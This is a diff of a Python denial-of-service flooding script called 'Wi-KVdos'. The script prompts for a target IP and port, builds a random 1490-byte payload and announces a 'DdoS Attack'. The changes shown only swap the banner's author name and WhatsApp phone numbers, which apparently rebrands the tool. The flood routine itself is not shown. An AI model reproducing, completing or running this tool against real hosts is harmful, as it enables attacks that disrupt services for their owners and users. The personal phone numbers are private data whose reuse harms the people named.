@@ -21,19 +21,19 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet Wi-KVdos")
 print (''' \033[92m
-          .;' Mohammed Al -Ahmadi `;,
+          .;' الرعب الهرم الشمالي  `;,
         .;'  ,;'             `;,  `;,   Wi-KVdos v2.0 (Mo-Ah)
        .;'  ,;'  ,;'     `;,  `;,  `;,
-        ::   ::   :   ( )   :   ::   ::  Mohammed Al -Ahmadi
+        ::   ::   :   ( )   :   ::   ::  الرعب الهرم الشمالي
         ':.  ':.  ':. /_\ ,:'  ,:'  ,:'
          ':.  ':.    /___\    ,:'  ,:'   
           ':.       /_____\      ,:'    https://github.com/sojxk212
                    /       \
 
  "Coded By : Mr.BL4Z3"
- "Author   : Mohammed Al -Ahmadi"
- "Github   : https://github.com/sojxk212" "whatsapp  : https://api.whatsapp.com/send?phone=+967778239092"
- "whatsapp :https://api.whatsapp.com/send?phone=+967738325474"
+ "Author   : الرعب الهرم الشمالي"
+ "Github   : https://github.com/sojxk212" "whatsapp  : https://api.whatsapp.com/send?phone=+967734370593"
+ "whatsapp :https://api.whatsapp.com/send?phone=+967734370593"
  \033[0m''')
 print("\033[96m")
 ip = raw_input("IP Target : ")
@@ -41,7 +41,7 @@ port = input("Port       : ")
 os.system("clear")
 print("\033[96m")
 os.system("figlet DdoS Attack")
-print("Team : Mohammed Al -Ahmadi")
+print("Team : الرعب الهرم الشمالي")
 print ("\033[94m")
 print "[                    ] 0% "
 time.sleep(3)
